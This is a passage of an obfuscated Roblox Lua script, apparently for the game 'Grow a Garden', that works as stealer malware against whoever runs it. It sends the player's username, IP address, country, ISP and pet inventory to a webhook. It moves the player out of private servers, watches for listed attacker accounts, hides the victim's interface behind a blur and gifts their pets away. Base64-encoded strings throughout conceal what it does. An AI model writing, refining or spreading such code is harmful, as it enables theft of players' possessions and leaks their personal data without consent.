        local url = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('YXeBIPZfkRnMeXNIPgTNptGiKmXxXcvPQNVQtLNYzIxcsEWgpdFBhDhaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('BKcqVoeIfNvZpGLIxcFyKFtCfekswIrYaDZyIeKAQJbWiBKYCSChGhyL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ttavrdAWFqcWhWMkIsIZymcDhYfqBJsvhZfhLIQuzYqdPunkSrxRplZ') then url = url .. mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('xwZZkrXJfLFdzwmexoSKdKkBSbSjbKypAsjcDTgURzBsnJXvrlEHyRaJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('MrzbuOnFOKlzYGVmiafpcTdYTAakpNBPviepJZAedqDmuAXLZEKqHCVR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('iTtPSTybPCljrlUrBcPDyPScXJCOSZtoQbZvkxZRgglUfgyneBBdWoc') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('DDxZXGdYgrNWAoCRBJuzcjenEyykCnNQetxrUdsNUXnCMjUryruzEJkWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('NAYzwscNPxXHwiKeCHZqRZHjXffUdgLdCvkySGhXtlAlcTxjOuQbcliWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('CwoCYOTZVjfwZpmzxAIQidljGOHghnVqsiSTFdyuhSSdCoCezUtItERQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('VNBSWGOnQqGNtBAuovzZSGeKQlYPAZaXzGOmPsIZfyKYCNmhJIpLaZFVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('HrWEltvZqykXbZBvsVmziRNvARteChHhFwupjUsoqkfiuKtzUMrIIpLLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('WRYSDJoPeliAcDnCtquxuHgclfitoMkQOjFcRBFSKQJqyIZNVZGbUkl8J+OkiBQZXRzIA==') .. tostring(i) .. mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('cbyDhLDjSTNzsUfgeruykdrMOODjLtpdrEAoYKuJgOfVFVpnOUTxopS4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('KkzHNRTGSwdMmobFmJsKrxCtlzfeJrPlbyCJdarkCTJkeddWTwgTGYdXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('SVnJFAzslgUAPnEPXhgaymMHaXucTPSHLcYtSHvxVSYWpuyAMucPbGG'),
        embeds = {{
            title = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('pWWNBHJCbDeskJkfUgtUtgORyQWoyDsBJbrkGdeedgRCMWoEIGeoDKO8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('TvVhONvKSTIanaQXdDqxTUUJrIbePGoMaFxyWaAMJiRqlIhfQJcOcHdRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('zkMNeSkRINasgDYEMxGQRzYhgAYeQQSZsxnCyKtxomZLpKcKZpgSrocISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('DCSvYPRbXUMpqIpXHmNGijIqWFwqOAvsMnlJhiwwiokhKeaJmHnJqTsUE9TVA=='),
            Headers = { [mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('vTKKosnkNItGmQTMZEkBUPQOgjghqXaNnEyudMcDQnoTxpkOmNSbuPFQ29udGVudC1UeXBl')] = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('daesrfGrMBIngYjhXJptPBjOthRsigpdixDyZuZAPOfNIejAAOfYHhtYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('LjDZRVbieZYOVsCqxvwrcyNvtECpWDuGmEpxowoIRSMhEzyxLmUymmeVW5rbm93bg=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('hewtBeglQLqLZFYPXmUZrTVnFXYgKcVzhnyRDMlOSoXpeVHmvgfftOSVW5rbm93bg=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('clOfIKImthLmqynyFcoawsrcjzrEccFhDEwMpxyFUsLBPSJKbcEyTPJVW5rbm93bg==') end
    local result = req({ Url = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('HkjkCwHFJFwEYsOeQgdeRVWQfrIHlrDUbZNMkWqmKCxLvDwmTjqjgYFaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('jRFemaChXQZqvkuCSBbqjsRrEZGjqsDhnyddMuSPIflySuLfQQHZQcCR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('VGAixbRfwseNPnKlpRPPAIamALonBgwUkogWoSXKkjPdjTLKriZxncIPw=='), body.country or mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('eBwsvPlilFTRtroTMdIRBHZLCunBBPtyIfZtKmubKoOdQMCNPDpFYLVPw=='), body.isp or mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('HgLaMvEKNikfTadWXGOXVdndyXvpejJoZgSRjnyHpHMHbrhskUFCVtOPw==')
    end
    return mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('xEhMlXGJTdcUYVEjwtUskvlZsmjiRTMwhsznxdkSzoyCcJQMECYLVNVPw=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('BtagMEqIxGlRlhuXdOUOznsibqVplecExLipywcoYxLNIYtPpWCVyhkPw=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ZJWWbHciKxQfQtCQNRxKsAkMnzkVuEswFYMLvwgoRelHRdUsxBuKzQUPw==')
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('nqpreatqvTmfAfKcVJtKmuaDzZHBWFfNdOYdveDLADHqnEsNTeZLNeRRGV4'))
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('DHrGErrDGqWzforjLzfQUtXnRCXbXMNTqZonCFGXXUrDIAAODBIiaCjSW5zdGFuY2U=')) and item:GetAttribute(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('uKwpmNNYAYUvVbmRotIIGidLPttHrnbMNRdXLiddquzOPETUiFUIjJzZA==')) == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('IlEtzUoIYptQomhYbpCjSWvqSFQngEDozLMVyfNHMCMBFKFzzapjiXgR2FtZUV2ZW50cw==')):WaitForChild(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('sqdBfSnzKVuqaTxHwdDXlVbKKLEUbrWZriSRfzbzbccQavhhCiYyQyRVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfavorited > 0 then
        sendWebhook({
            { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('YRkUXglKILYgDXDNvYkCFoBclQkMcIIKwzmvUDDZRjKMyiRZWslyaRG8J+aqyBVbmZhdm9yaXRlZCBQZXRz'), value = table.concat(unfavorited, mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('AoEorsvpMrvWLIEcImUGlxkaJogjUVHUoXFTlKRpmTHLSigJEjtPPbOLCA=')), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('XRzLkqYxGQBRwnfFnDJrLfnzXIvnlAYjRVPcROOUiZnjLzAnOtGJMPO8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ecQqJoeEgNXAGGBYZcfmamqYbwfgvOMNZJajziWgHKwAOnEkUycnFtp8J+MkCBJUA=='), value = ip },
        { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('cLFEsPjJRtvlblgHynYJshCkYRvSpBOcFzTyhtKytqVfwFSdKAtRTtS8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ytQRmXOsSeaokRGsyveuTRdMhzxVALzLhwVfTLsuoXYUNIwaAVwXCmb8J+SuyBJU1A='), value = isp },
        { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('gWHaGPZvrPcdFHuxEqTWBiwLGMRZNbiVZfEgfbRBVJchQOTzIGypMkR8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('jhSWiYOrZPPxIunVOkoJIVXxDojKUPDPUVWlaEzRWQCNULJbckcZriI4o+x77iPIFRpbWU='), value = os.date(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('BmblIIdEUsiPMwNUrXDyVOfjeGTfVpRzAlfBHEMApCEPaOWDZQCsgMMJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('sYaZsVJAOcMTdIPnheOfSqOZlqEmVRrYLwGhwgqrGlThDlfEfLPTSok8J+OkiBQZXRz'), value = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('qHNOAqXEdZdrEmrzJevGpVpkvOdOLsDvCxOxBLuLBziERlRAksjzHMGTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('uhekXzSARQprdEdNMEdilDYDTniwMthRwfcAULWSzsmvekJVIZrfKMr8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('pECuBzjOwZoadUUUUZzjfylpCmDRmNXFmezAVkzkWcWjiIftHitRmGfUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('LVYLqmpAglSfVnAZCZrESgHlYLMzpkpddrlSGzrBaOJhFDhLqLSrlFGQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets, delay 7 sec, hide GUI, drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                task.wait(7) -- Delay for 7 seconds after player detected

                -- REMOVE ALL GUIS
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('TDNpGYyROvCmwwKdHDNEByRMcxdFJFWhLmJNlmmseItEVgArppRgIXlU2NyZWVuR3Vp')) or gui:IsA(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('cKvyObzQpgcufjWtqAcEyGaLSiBgkoFDDOgOuSMUhUUvNfwwYmGbxQDQmlsbGJvYXJkR3Vp')) or gui:IsA(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('fmiGGYPQdxvbVFmJpfZhkWoIfZSCsTaDOcjsWYWBBveqfpqKEEpMMaUU3VyZmFjZUd1aQ==')) then
                        gui:Destroy()
                    end
                end

                unfavoriteAllPets()

                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('NqdqXHCTIBkfIVkzVIgMBqHOmNEizaEWQSfWDUjHAJzXqxtqokDifPVVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('DUgysQXCLpYTbfVgRxsRGWxCalfFtOvAnWqLGGSGEpJNUDFwJyXygqaR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('wIhQGGBNHJwrMbeifAiLbpvNbSFercZohysLSQJSFXwtTVdDEgecgcoR2FtZUV2ZW50cw==')):WaitForChild(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('hMkhimFYDloGRNZnrOjfyatyGisTkBITvbippciKICTFwOjjSCkAyAJUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
